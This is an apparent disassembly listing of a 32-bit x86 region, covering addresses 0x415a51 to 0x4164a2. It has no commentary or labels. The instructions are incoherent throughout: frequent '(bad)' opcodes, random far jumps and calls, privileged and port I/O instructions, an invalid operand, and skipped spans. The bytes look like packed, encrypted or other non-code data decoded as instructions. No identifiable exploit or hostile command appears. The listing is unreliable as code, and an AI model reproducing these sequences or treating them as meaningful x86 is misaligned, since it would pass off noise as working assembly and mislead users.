  415a51:	add    edi,edi
  415a53:	jo     0x415a6e
  415a55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a56:	push   eax
  415a57:	inc    DWORD PTR [eax]
  415a59:	or     eax,0x62bfc1c6
  415a5e:	(bad)  [edx-0x765571d0]
  415a64:	and    eax,0xe38f3bb3
  415a69:	cmc    
  415a6a:	retf   0x74b2
  415a6d:	jae    0x415a34
  415a6f:	jecxz  0x415ad4
  415a71:	(bad)  
  415a73:	je     0x415a11
  415a75:	dec    ebp
  415a76:	not    bl
  415a78:	push   edx
  415a79:	dec    esi
  415a7a:	hlt    
  415a7b:	mov    esp,ebx
  415a7d:	cmp    DWORD PTR [edi+edx*1],esp
  415a80:	rcl    BYTE PTR [ecx+esi*4+0x74140322],cl
  415a87:	add    bl,BYTE PTR [ebx+edi*1-0x7e04dc57]
  415a8e:	lock push eax
  415a90:	fwait
  415a91:	int3   
  415a92:	gs xchg edx,eax
  415a94:	push   ecx
  415a95:	mov    eax,ds:0xc5ec27b5
  415a9a:	ds push edx
  415a9c:	inc    ebx
  415a9d:	(bad)  
  415a9e:	loop   0x415a8e
  415aa0:	shl    BYTE PTR [ebx],1
  415aa2:	(bad)  
  415aa3:	xchg   DWORD PTR [eax],esp
  415aa5:	jae    0x415ad3
  415aa7:	sub    al,cl
  415aa9:	retf   0xbdc8
  415aac:	inc    ebp
  415aad:	icebp  
  415aae:	pop    esp
  415aaf:	push   0x4d57a68d
  415ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ab5:	das    
  415ab6:	sbb    ecx,DWORD PTR [edi]
  415ab8:	or     DWORD PTR [eax],0x32
  415abb:	stos   BYTE PTR es:[edi],al
  415abc:	js     0x415b1d
  415abe:	aam    0x3
  415ac0:	imul   eax,ebx,0xffffffea
  415ac3:	iret   
  415ac4:	jb     0x415a68
  415ac6:	rcl    BYTE PTR [ecx],1
  415ac8:	lldt   WORD PTR [ebx]
  415acb:	repz mov edi,0xbc0389a
  415ad1:	fiadd  WORD PTR [ebx]
  415ad3:	scas   al,BYTE PTR es:[edi]
  415ad4:	jns    0x415a8e
  415ad6:	je     0x415a70
  415ad8:	in     al,0xe4
  415ada:	dec    edi
  415adb:	daa    
  415adc:	pop    ecx
  415add:	call   0xcb81:0xafbd1352
  415ae4:	inc    BYTE PTR [ecx]
  415ae6:	ins    BYTE PTR es:[edi],dx
  415ae7:	jb     0x415a7c
  415ae9:	stc    
  415aea:	xor    al,0x3
  415aec:	cwde   
  415aed:	pushf  
  415aee:	mov    al,0xbf
  415af0:	jp     0x415a94
  415af2:	inc    ebp
  415af3:	dec    esi
  415af4:	push   edi
  415af5:	xor    al,0x2b
  415af7:	lods   eax,DWORD PTR ds:[esi]
  415af8:	push   ebx
  415af9:	xchg   ecx,eax
  415afa:	outs   dx,BYTE PTR ds:[esi]
  415afb:	mov    es,edi
  415afd:	sub    DWORD PTR [esi],edi
  415aff:	inc    edx
  415b00:	and    BYTE PTR [edi-0x25],cl
  415b03:	xchg   edx,eax
  415b04:	imul   esp,esp,0xa445670a
  415b0a:	retf   
  415b0b:	out    dx,eax
  415b0c:	(bad)  
  415b0d:	ds stc 
  415b0f:	mov    al,BYTE PTR [eax]
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fdiv   QWORD PTR [edx+0x28493e81]
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR [ecx+eax*1],al
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	loop   0x415bf3
  415b8e:	sbb    al,0x9f
  415b90:	cmp    al,0x93
  415b92:	jno    0x415b9f
  415b94:	mov    ebx,0xb408e16f
  415b99:	jb     0x415bc5
  415b9b:	dec    edi
  415b9c:	pop    ebp
  415b9d:	pop    edx
  415b9e:	and    edx,DWORD PTR [ebx-0x1d54b0b5]
  415ba4:	adc    ah,al
  415ba6:	dec    ebx
  415ba7:	ja     0x415bf4
  415ba9:	dec    esi
  415baa:	jmp    0x20f3:0x1dd4c116
  415bb1:	xchg   ebp,eax
  415bb2:	fmulp  st(2),st
  415bb4:	pop    es
  415bb5:	call   0xc1de81a7
  415bba:	enter  0x9179,0xd3
  415bbe:	test   DWORD PTR [edi],esi
  415bc0:	dec    ebp
  415bc1:	cld    
  415bc2:	ficom  WORD PTR [eax+0x64]
  415bc5:	mov    dl,0x9e
  415bc8:	fadd   st,st(2)
  415bca:	sbb    DWORD PTR [eax-0x3d],edi
  415bcd:	outs   dx,BYTE PTR ds:[esi]
  415bce:	mov    edi,0x7cbbbed8
  415bd3:	hlt    
  415bd4:	cmp    dh,al
  415bd6:	int    0x6e
  415bd8:	add    DWORD PTR ds:0x74cbd8ae,ebx
  415bde:	pusha  
  415bdf:	loopne 0x415be8
  415be1:	shl    eax,1
  415be3:	fadd   st(6),st
  415be5:	(bad)  
  415be6:	fiadd  DWORD PTR [eax-0x4ef20b8c]
  415bec:	push   ss
  415bed:	xor    DWORD PTR [esi+0x1],esi
  415bf0:	cmp    ecx,DWORD PTR ds:0x7fbf6310
  415bf6:	mov    ebx,0x74864522
  415bfb:	mov    eax,ds:0x35d5e3e3
  415c00:	xchg   ecx,eax
  415c01:	mov    esi,0x64436381
  415c06:	psubusw mm3,QWORD PTR [eax+0x65]
  415c0a:	push   edx
  415c0b:	sahf   
  415c0c:	jcxz   0x415bb7
  415c0f:	dec    ebx
  415c10:	adc    ah,0xff
  415c13:	mov    dh,0x10
  415c15:	(bad)  
  415c16:	and    al,0x9d
  415c18:	cmp    eax,0xb5160648
  415c1d:	jno    0x415bd4
  415c1f:	imul   edi,DWORD PTR [eax-0x3be8046d],0x16
  415c26:	mov    BYTE PTR [eax],dh
  415c28:	add    al,0xf0
  415c2a:	stos   DWORD PTR es:[edi],eax
  415c2b:	inc    ebp
  415c2c:	or     al,0x87
  415c2e:	ficomp WORD PTR [esi+0x45]
  415c31:	adc    eax,0x7fee748b
  415c36:	push   edx
  415c37:	inc    ebp
  415c38:	ins    BYTE PTR es:[edi],dx
  415c39:	mov    cl,0x6b
  415c3b:	adc    eax,0x329a72ea
  415c40:	mov    ebp,0x2d07a8a7
  415c45:	or     bh,ch
  415c47:	cmp    BYTE PTR [edi-0x2b0fe7b2],cl
  415c4d:	mov    eax,0xd0f6352c
  415c52:	int    0xa5
  415c54:	paddsb mm4,QWORD PTR [edi]
  415c57:	push   eax
  415c58:	pusha  
  415c59:	enter  0xe54b,0x19
  415c5d:	pop    ecx
  415c5e:	mov    edi,0x431a945b
  415c63:	outs   dx,DWORD PTR ds:[esi]
  415c64:	sahf   
  415c65:	out    0x64,al
  415c67:	test   BYTE PTR [edx-0x11],bh
  415c6a:	iret   
  415c6b:	add    ch,BYTE PTR [esi]
  415c6d:	sbb    BYTE PTR [ebx],dh
  415c6f:	jb     0x415cc2
  415c71:	call   FWORD PTR [ecx+0x1f]
  415c74:	out    0x20,al
  415c76:	repnz mov esi,0x438bc61f
  415c7c:	jmp    FWORD PTR [ebp-0x5a]
  415c7f:	or     BYTE PTR [ecx-0x2b],cl
  415c82:	test   DWORD PTR [ebp+0x4c836482],esp
  415c88:	out    0x0,al
  415c8a:	loope  0x415c4e
  415c8c:	or     eax,0x82f51c
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x2cd4901f
  415d03:	imul   BYTE PTR [esi+eiz*8]
  415d06:	add    BYTE PTR [eax],al
  415d08:	add    al,0x1
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	out    dx,al
  415d0d:	pop    ss
  415d0e:	cmp    eax,0x46ab2404
  415d13:	mov    ch,0xe1
  415d15:	xor    BYTE PTR [esi],cl
  415d17:	int    0x9c
  415d19:	xchg   BYTE PTR [eax+ecx*4-0x6330c025],al
  415d20:	lds    esi,FWORD PTR [eax+0x7b]
  415d23:	pop    ebp
  415d24:	sbb    eax,0xa83fa760
  415d29:	xchg   edx,eax
  415d2a:	bound  ebx,QWORD PTR [ebp-0x504a777b]
  415d30:	hlt    
  415d31:	loop   0x415da5
  415d33:	add    ebp,DWORD PTR [edx+eiz*8-0x4867542]
  415d3a:	mov    esi,0xe7cf2792
  415d3f:	dec    esi
  415d40:	mov    cl,0x5a
  415d42:	shl    esi,1
  415d44:	repz test eax,0x9c75ca49
  415d4a:	cmp    DWORD PTR [esi],0x52516c15
  415d50:	push   ebx
  415d51:	mov    cl,cl
  415d53:	mov    esp,DWORD PTR [ecx-0x2]
  415d56:	(bad)  
  415d57:	imul   edx,DWORD PTR [eax+edx*1],0xffffff8e
  415d5b:	(bad)  [edi+0x62d50be8]
  415d61:	xchg   edx,eax
  415d62:	jne    0x415d54
  415d64:	push   ebp
  415d65:	xchg   esp,eax
  415d66:	pushf  
  415d67:	push   esi
  415d68:	adc    al,0xdc
  415d6a:	push   edi
  415d6b:	mov    BYTE PTR [ecx],ch
  415d6d:	fist   DWORD PTR [eax+0x77]
  415d70:	fst    QWORD PTR [esi]
  415d72:	cmp    ah,BYTE PTR [ebx-0x25db3041]
  415d78:	std    
  415d79:	rol    ecx,cl
  415d7b:	xor    ecx,DWORD PTR [esi+0x5b]
  415d7e:	mov    eax,ds:0x3a885a2c
  415d83:	icebp  
  415d84:	mul    cl
  415d86:	sbb    esi,DWORD PTR [ecx+0x5408af6f]
  415d8c:	xor    dh,BYTE PTR [edx-0x5e29217b]
  415d92:	mov    ?,WORD PTR [edi]
  415d94:	inc    eax
  415d95:	xchg   edx,eax
  415d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d97:	xor    eax,0x9dffa638
  415d9c:	cs mov eax,ss
  415d9f:	jmp    0x42d05e83
  415da4:	add    al,0xb6
  415da6:	into   
  415da7:	sbb    eax,0x44ba0356
  415dac:	enter  0x4a82,0x6b
  415db0:	fisubr WORD PTR [ecx]
  415db2:	daa    
  415db3:	add    esi,DWORD PTR [esi-0x33]
  415db6:	outs   dx,BYTE PTR ds:[esi]
  415db7:	fs out 0xa3,al
  415dba:	mov    WORD PTR [edx+0x0],cs
  415dbd:	add    al,BYTE PTR [edi]
  415dbf:	(bad)  
  415dc0:	and    ecx,esi
  415dc2:	inc    ecx
  415dc3:	loope  0x415e0e
  415dc5:	or     edx,edi
  415dc7:	addr16 xchg ebp,eax
  415dc9:	aaa    
  415dca:	daa    
  415dcb:	sub    ecx,DWORD PTR [ebx]
  415dcd:	mov    DWORD PTR [eax-0x71],ebp
  415dd0:	adc    ecx,DWORD PTR [edi-0x31]
  415dd3:	loop   0x415da4
  415dd5:	inc    edx
  415dd6:	jae    0x415e55
  415dd8:	push   ss
  415dd9:	jmp    0x4498:0x7815ff82
  415de0:	retf   0xcbfa
  415de3:	inc    DWORD PTR [edx-0x80]
  415de6:	sub    BYTE PTR [esp+ecx*4+0x11],dh
  415dea:	or     al,0xd3
  415dec:	fnstcw WORD PTR [ecx]
  415dee:	jb     0x415d93
  415df0:	xchg   ebp,eax
  415df1:	push   ss
  415df2:	scas   eax,DWORD PTR es:[edi]
  415df3:	ja     0x415e2c
  415df5:	cmp    eax,edx
  415df7:	inc    eax
  415df8:	hlt    
  415df9:	sub    DWORD PTR ds:0xbb3fb986,ecx
  415dff:	repnz add edx,0xe50ca6df
  415e06:	or     eax,0x34f94432
  415e0b:	mov    edi,ebp
  415e0d:	jnp    0x415de5
  415e0f:	popa   
	...
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax+0x13]
  415e81:	loop   0x415eb4
  415e83:	push   esi
  415e84:	xor    bh,ah
  415e86:	add    BYTE PTR [eax],al
  415e88:	add    al,0x1
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	cmp    DWORD PTR [eax],0xffffffea
  415e8f:	push   eax
  415e90:	ds scas al,BYTE PTR es:[edi]
  415e92:	leave  
  415e93:	cdq    
  415e94:	cmp    BYTE PTR [esi],dl
  415e96:	cld    
  415e97:	test   esi,0x37f28800
  415e9d:	sbb    eax,0x562137db
  415ea2:	xor    eax,0x3584017a
  415ea7:	int3   
  415ea8:	push   ds
  415ea9:	push   edx
  415eaa:	fs jne 0x415e45
  415ead:	loopne 0x415ef3
  415eaf:	fsubr  DWORD PTR [edx-0x4a]
  415eb2:	cmp    eax,0xdac433b
  415eb7:	fmul   QWORD PTR [eax+0x388aa7f2]
  415ebd:	(bad)  
  415ebe:	in     al,0x1a
  415ec0:	pop    ebp
  415ec1:	iret   
  415ec2:	add    eax,0x8b12d107
  415ec7:	mov    eax,0x5933c64d
  415ecc:	mov    ds:0xedc7af3b,al
  415ed1:	mov    dh,0x66
  415ed3:	sti    
  415ed4:	and    BYTE PTR [edx-0x7b286428],ah
  415eda:	inc    esp
  415edb:	mov    edx,0x45632658
  415ee0:	jmp    0x1c6f9654
  415ee5:	out    0x90,al
  415ee7:	repnz inc esp
  415ee9:	cdq    
  415eea:	mov    eax,DWORD PTR [esi+eax*1+0x43]
  415eee:	lods   al,BYTE PTR ds:[esi]
  415eef:	into   
  415ef0:	xor    BYTE PTR [ebx],ah
  415ef2:	add    BYTE PTR [edx],ah
  415ef4:	dec    esi
  415ef5:	push   es
  415ef6:	xor    edx,DWORD PTR [ecx+0x553d7eb4]
  415efc:	mov    dl,0x60
  415efe:	ret    
  415eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f00:	sbb    al,0x68
  415f02:	inc    edi
  415f03:	xchg   ebx,eax
  415f04:	lock shr BYTE PTR [ecx+0x5f6c8c4d],1
  415f0b:	adc    eax,0x183a8e02
  415f10:	pushf  
  415f11:	mov    ebx,0x2fe80e34
  415f16:	xlat   BYTE PTR ds:[ebx]
  415f17:	push   edi
  415f18:	adc    DWORD PTR [edi-0x3a4ed4b6],0x1b
  415f1f:	hlt    
  415f20:	imul   ebx,DWORD PTR [esi-0x397f5447],0xffffffa9
  415f27:	and    bl,dl
  415f29:	rol    DWORD PTR [edx+esi*2-0x36],cl
  415f2d:	in     al,dx
  415f2e:	adc    DWORD PTR [ebx+0x1aafbcbf],ecx
  415f34:	and    BYTE PTR [edi+ebx*8-0x4bfaa90a],0xdb
  415f3c:	and    al,0xb2
  415f3e:	(bad)  
  415f3f:	jno    0x415fb2
  415f41:	stos   BYTE PTR es:[edi],al
  415f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f43:	mov    DWORD PTR [edi+edi*2-0xc4a0aa2],edx
  415f4a:	aas    
  415f4b:	jmp    0x40ef1b84
  415f50:	mov    ecx,0xbbf8bac5
  415f55:	not    BYTE PTR [edi-0x583afda4]
  415f5b:	leave  
  415f5c:	xchg   ecx,eax
  415f5d:	mov    ebp,0x97b7af57
  415f62:	js     0x415efd
  415f64:	nop
  415f65:	retf   
  415f66:	or     al,0x67
  415f68:	ins    BYTE PTR es:[edi],dx
  415f69:	or     ecx,eax
  415f6b:	push   edx
  415f6c:	fisttp WORD PTR [ecx+0x45d1d93c]
  415f72:	lds    esi,FWORD PTR [eax+ecx*2-0x32]
  415f76:	jnp    0x415fb7
  415f78:	mov    ebx,0x4fc628f4
  415f7d:	popf   
  415f7e:	out    dx,al
  415f7f:	popf   
  415f80:	lods   eax,DWORD PTR ds:[esi]
  415f81:	mov    ebx,0x99486f7a
  415f86:	mov    ss,edi
  415f88:	xor    dl,bh
  415f8a:	adc    eax,ebp
  415f8c:	inc    ebp
  415f8d:	lock push edi
  415f8f:	jae    0x415f91
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	sbb    DWORD PTR [edi-0x2b],esi
  416003:	arpl   WORD PTR [eax+ebp*8],si
  416006:	add    BYTE PTR [eax],al
  416008:	add    al,0x1
  41600a:	add    BYTE PTR [eax],al
  41600c:	sub    bh,BYTE PTR [ecx]
  41600e:	pop    ebx
  41600f:	out    dx,al
  416010:	loop   0x41601e
  416012:	in     eax,dx
  416013:	popf   
  416014:	pop    eax
  416015:	or     al,0xa0
  416017:	adc    al,0xce
  416019:	sbb    eax,0x77287aa3
  41601e:	push   0x8807508a
  416023:	or     dh,BYTE PTR [edx+esi*8+0x2]
  416027:	inc    ebp
  416029:	jo     0x416069
  41602b:	(bad)  
  41602d:	push   ds
  41602e:	outs   dx,BYTE PTR ds:[esi]
  41602f:	push   cs
  416030:	out    dx,al
  416031:	xor    BYTE PTR ss:[si],0x5b
  416036:	cmp    BYTE PTR [edx-0x4a],0xd7
  41603a:	fistp  DWORD PTR [edx+ebx*4-0x53]
  41603e:	jmp    0x4920:0x476c4b6
  416045:	aam    0x23
  416047:	popf   
  416048:	outs   dx,DWORD PTR ds:[esi]
  416049:	push   cs
  41604a:	in     eax,0x40
  41604c:	retf   
  41604d:	aad    0xc0
  41604f:	icebp  
  416050:	(bad)  
  416051:	xor    al,0x84
  416053:	sub    BYTE PTR [edx],ch
  416055:	repz xchg esi,eax
  416057:	sub    al,0x44
  416059:	fiadd  WORD PTR [edx]
  41605b:	mov    ebx,DWORD PTR [ebp-0x90ba9a9]
  416061:	push   eax
  416062:	data16 xlat BYTE PTR ds:[ebx]
  416064:	imul   edx,DWORD PTR [esi+0x3f],0xffffffb5
  416068:	mov    edx,esp
  41606a:	mov    esi,0xa038ec0a
  41606f:	std    
  416070:	xchg   ebp,eax
  416071:	pop    esp
  416072:	sbb    BYTE PTR [ebp+0x3f],al
  416075:	daa    
  416076:	mov    al,0x17
  416078:	sub    DWORD PTR [ebx+0x6841d93e],eax
  41607e:	add    DWORD PTR [eax-0x2e1a7743],ebx
  416084:	mov    edx,0xe6df05a9
  416089:	mov    ah,0x0
  41608b:	in     eax,dx
  41608c:	or     bh,ch
  41608e:	lds    eax,FWORD PTR cs:[edx+0x24bb290e]
  416095:	clc    
  416096:	addr16 in eax,0xc0
  416099:	lods   eax,DWORD PTR ds:[esi]
  41609a:	sub    al,0xb3
  41609c:	and    DWORD PTR ds:0x4d3d984f,edx
  4160a2:	push   0xfffffff0
  4160a4:	out    0xe4,eax
  4160a6:	push   cs
  4160a7:	in     al,dx
  4160a8:	inc    esi
  4160a9:	(bad)  
  4160aa:	adc    eax,0xbde9d678
  4160af:	fst    QWORD PTR [ebx+0xa]
  4160b2:	mov    ch,0xa6
  4160b4:	retf   0x3ab8
  4160b7:	rol    ebx,cl
  4160b9:	es sbb al,0xb9
  4160bc:	scas   al,BYTE PTR es:[edi]
  4160bd:	shr    cl,1
  4160bf:	retf   0xb6aa
  4160c2:	adc    esi,DWORD PTR [edx]
  4160c4:	adc    BYTE PTR [ebp-0x4e],bl
  4160c7:	dec    eax
  4160c8:	cs (bad) 
  4160ca:	fcom   QWORD PTR [ecx-0x4b]
  4160cd:	int3   
  4160ce:	popf   
  4160cf:	je     0x416085
  4160d1:	push   0x12fa9695
  4160d6:	outs   dx,BYTE PTR ds:[esi]
  4160d7:	(bad)  
  4160d8:	outs   dx,BYTE PTR ds:[esi]
  4160d9:	mov    WORD PTR [ecx+0x1e],ds
  4160dc:	push   0x13d9d7a
  4160e1:	xchg   ecx,eax
  4160e2:	out    dx,al
  4160e3:	std    
  4160e4:	inc    ecx
  4160e5:	mov    edi,0xe209591d
  4160ea:	sbb    cl,dl
  4160ec:	js     0x4160d4
  4160ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160f0:	cmp    bh,BYTE PTR [esi-0x4]
  4160f3:	add    BYTE PTR [edi],dl
  4160f5:	ror    ch,cl
  4160f7:	adc    edi,DWORD PTR [ecx+0x3c]
  4160fa:	cli    
  4160fb:	cs (bad) 
  4160fd:	shr    DWORD PTR [edx+esi*8],cl
  416100:	ins    DWORD PTR es:[edi],dx
  416101:	add    BYTE PTR [edx+0x7474cb51],al
  416107:	iret   
  416108:	cmp    ebp,ebx
  41610a:	ret    0x32dd
  41610d:	fs pop edx
  41610f:	lods   al,BYTE PTR ds:[esi]
	...
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0x854c28f3
  416183:	sub    edi,DWORD PTR [eax]
  416185:	jmp    0x145618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	out    0x2c,al
  41618e:	int3   
  41618f:	pop    es
  416190:	xchg   ecx,eax
  416191:	jns    0x416119
  416193:	lahf   
  416194:	push   es
  416195:	pop    es
  416196:	cmp    DWORD PTR [eax+eiz*1],esp
  416199:	jecxz  0x41612a
  41619b:	outs   dx,DWORD PTR ds:[esi]
  41619c:	idiv   BYTE PTR [ecx-0x47]
  41619f:	jno    0x416188
  4161a1:	lods   al,BYTE PTR ds:[esi]
  4161a2:	cmp    bh,ah
  4161a4:	pop    edi
  4161a5:	fld    TBYTE PTR [ecx]
  4161a7:	call   0x5434575d
  4161ac:	cmp    BYTE PTR [eax+0x2d66de12],ch
  4161b2:	push   0x25
  4161b4:	and    al,0x38
  4161b6:	push   ds
  4161b7:	pop    edx
  4161b8:	sub    BYTE PTR [esi-0x72],ch
  4161bb:	push   eax
  4161bc:	pop    es
  4161bd:	clc    
  4161be:	aaa    
  4161bf:	in     al,0x6d
  4161c1:	inc    eax
  4161c2:	mov    eax,0xe0e02bd3
  4161c7:	mov    ds:0x9b50af77,eax
  4161cc:	das    
  4161cd:	daa    
  4161ce:	leave  
  4161cf:	fnstenv [edx]
  4161d1:	push   es
  4161d2:	jmp    0xcd77d53d
  4161d7:	push   ss
  4161d8:	cmp    BYTE PTR [ebp+ebx*2-0x53],0xc7
  4161dd:	inc    edi
  4161de:	in     al,dx
  4161df:	in     al,0x47
  4161e1:	into   
  4161e2:	and    al,cl
  4161e4:	outs   dx,BYTE PTR ds:[esi]
  4161e5:	ja     0x416261
  4161e7:	fs dec esp
  4161e9:	mov    BYTE PTR [ebx+eiz*4-0x6ef16c0],ch
  4161f0:	mov    dh,BYTE PTR [edx]
  4161f2:	pop    ebx
  4161f3:	inc    dx
  4161f5:	mov    gs,edx
  4161f7:	adc    al,0x3e
  4161f9:	pop    esi
  4161fa:	in     al,dx
  4161fb:	add    DWORD PTR [ebx+0x1f],ecx
  4161fe:	mov    dl,0xa0
  416200:	pushf  
  416201:	sbb    eax,0xb55f2bc2
  416206:	push   cs
  416207:	and    ch,BYTE PTR [ebx+0xf07f2c4]
  41620d:	je     0x4161a8
  41620f:	jmp    0xcf47f6a3
  416214:	jb     0x416223
  416216:	hlt    
  416217:	mov    edi,DWORD PTR ds:0x1935c4cf
  41621d:	in     eax,dx
  41621e:	jae    0x41620d
  416220:	arpl   WORD PTR [ebx+ebx*4+0x46cc74f5],dx
  416227:	ja     0x4161aa
  416229:	test   al,0x34
  41622b:	ret    
  41622c:	mov    WORD PTR [ebp+0x63],cs
  41622f:	retf   
  416230:	test   DWORD PTR [ebx+ebp*4],edi
  416233:	dec    edi
  416234:	fwait
  416235:	mov    edi,0xb9d9830
  41623a:	cmp    DWORD PTR [eax+0x31],ecx
  41623d:	rol    DWORD PTR [eax+0x1c],cl
  416240:	add    ebp,ebp
  416242:	push   edx
  416243:	(bad)  
  416244:	push   esp
  416245:	rol    edi,1
  416247:	push   edx
  416248:	out    dx,eax
  416249:	popa   
  41624a:	lock jle 0x4161ed
  41624d:	mov    ds:0xefec80ad,al
  416252:	hlt    
  416253:	cmc    
  416254:	and    dl,bh
  416256:	xor    eax,0x70354c01
  41625b:	out    dx,al
  41625c:	(bad)  
  41625d:	in     al,0x9d
  41625f:	in     al,dx
  416260:	cmp    BYTE PTR [edx],ah
  416262:	sbb    eax,0x7ecb2d3b
  416267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416268:	or     ebp,eax
  41626a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41626b:	mov    eax,0x6a7b8b66
  416270:	mov    ds:0xae1e148b,eax
  416275:	push   ds
  416276:	cmp    DWORD PTR [ebp+0x33],0xb9ea0b4d
  41627d:	lods   eax,DWORD PTR ds:[esi]
  41627e:	div    DWORD PTR [ecx+edi*8+0x41c4c57a]
  416285:	push   cs
  416286:	mov    eax,0xf55725fa
  41628b:	mov    dh,0x4e
  41628d:	adc    dl,dl
  41628f:	fwait
	...
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3ccd:0x553473ee
  416305:	jmp    0x0:0x1040000
  41630c:	cs dec esi
  41630e:	jp     0x416317
  416310:	inc    ebp
  416311:	push   ecx
  416312:	mov    al,0x3
  416314:	fsubp  st(5),st
  416316:	add    BYTE PTR es:[eax-0x10],0x29
  41631b:	call   0x3f9e:0xb734e9d8
  416322:	push   eax
  416323:	push   cs
  416324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416325:	cmp    eax,0x52db7d8c
  41632a:	dec    DWORD PTR [eax+0xc]
  41632d:	sbb    DWORD PTR [ebp-0x1d105040],esp
  416333:	int3   
  416334:	into   
  416335:	dec    esi
  416336:	sub    DWORD PTR [edx],0x27ff3b0d
  41633c:	pop    eax
  41633d:	lds    edx,FWORD PTR [eax]
  41633f:	lea    ebx,[edx-0x22]
  416342:	inc    ebx
  416343:	or     ch,dl
  416345:	ds push 0x3e
  416348:	loope  0x41637d
  41634a:	lods   eax,DWORD PTR ds:[esi]
  41634b:	xchg   ebp,eax
  41634c:	stc    
  41634d:	mov    eax,0xba971136
  416352:	push   ebp
  416353:	fucom  st(6)
  416355:	cwde   
  416356:	out    dx,eax
  416357:	cli    
  416358:	mov    esi,DWORD PTR [ebx+0x2a]
  41635b:	dec    ebp
  41635c:	mov    al,0x60
  41635e:	pop    ds
  41635f:	ret    
  416360:	jne    0x41632f
  416362:	add    DWORD PTR [ecx+0x7a4558ec],ecx
  416368:	and    eax,0xe0247ffd
  41636d:	aam    0xa
  41636f:	xchg   eax,ecx
  416371:	pop    DWORD PTR [ecx-0x5b69a25c]
  416377:	fcomi  st,st(5)
  416379:	mov    dl,0x4b
  41637b:	or     ebp,DWORD PTR [edx]
  41637d:	xchg   DWORD PTR [edi],eax
  41637f:	jl     0x4163ff
  416381:	icebp  
  416382:	(bad)  
  416383:	in     eax,0x2c
  416385:	xchg   esi,eax
  416386:	lods   al,BYTE PTR ds:[esi]
  416387:	imul   ebp,DWORD PTR [edi-0x1b],0xd1d9cf9d
  41638e:	clc    
  41638f:	jae    0x4163eb
  416391:	data16 jns 0x4163de
  416394:	sahf   
  416395:	inc    edx
  416396:	adc    esi,DWORD PTR [ecx-0x54b43e3a]
  41639c:	rol    bh,0x2b
  41639f:	outs   dx,DWORD PTR ds:[esi]
  4163a0:	add    ebx,edi
  4163a2:	(bad)  
  4163a3:	nop
  4163a4:	mov    cl,0xe0
  4163a6:	push   esp
  4163a7:	cmp    BYTE PTR [ecx-0x1e],ch
  4163aa:	adc    eax,DWORD PTR [ecx+0xab2ac17]
  4163b0:	or     DWORD PTR [ebp-0xd554cd0],esi
  4163b6:	fstp   TBYTE PTR [ecx-0x3]
  4163b9:	xchg   DWORD PTR [ebp-0x4a38db7a],eax
  4163bf:	inc    ebx
  4163c0:	(bad)  
  4163c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163c2:	lfs    esi,FWORD PTR [ebp+0x3a50fbd1]
  4163c9:	mov    dh,BYTE PTR [edi-0x1acf2692]
  4163cf:	inc    ebx
  4163d0:	and    DWORD PTR [esi-0x4337b30f],edx
  4163d6:	mov    cl,0xa1
  4163d8:	leave  
  4163d9:	clc    
  4163da:	push   ecx
  4163db:	inc    ebp
  4163dc:	int3   
  4163dd:	and    BYTE PTR [ebx+0x31d87e98],0xae
  4163e4:	rcl    DWORD PTR [ebx-0x6b5a46c4],0xdf
  4163eb:	mov    eax,0x252f7228
  4163f0:	push   esp
  4163f1:	adc    bl,BYTE PTR [eax-0x1d]
  4163f4:	jg     0x4163fe
  4163f6:	arpl   WORD PTR [ecx],dx
  4163f8:	lods   eax,DWORD PTR ds:[esi]
  4163f9:	inc    ebp
  4163fa:	mov    ds:0x148f46f2,al
  4163ff:	push   ds
  416400:	xor    ebx,esi
  416402:	inc    ebx
  416403:	lods   al,BYTE PTR ds:[esi]
  416404:	adc    eax,0x5d4dacc4
  416409:	int    0x5a
  41640b:	fsub   DWORD PTR [esi+0xadb4d1]
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	xchg   ebx,eax
  416481:	scas   eax,DWORD PTR es:[edi]
  416482:	(bad)  
  416483:	sbb    DWORD PTR [eax-0x15],eax
  416486:	add    BYTE PTR [eax],al
  416488:	add    al,0x1
  41648a:	add    BYTE PTR [eax],al
  41648c:	jmp    0x41642e
  41648e:	cmovae edi,DWORD PTR [eax+0x197ce6bb]
  416495:	mov    eax,0x74dbf409
  41649a:	or     BYTE PTR [edx],bh
  41649c:	(bad)  
  41649e:	add    dh,BYTE PTR [ecx+eiz*2-0x65]
  4164a2:	cmc    
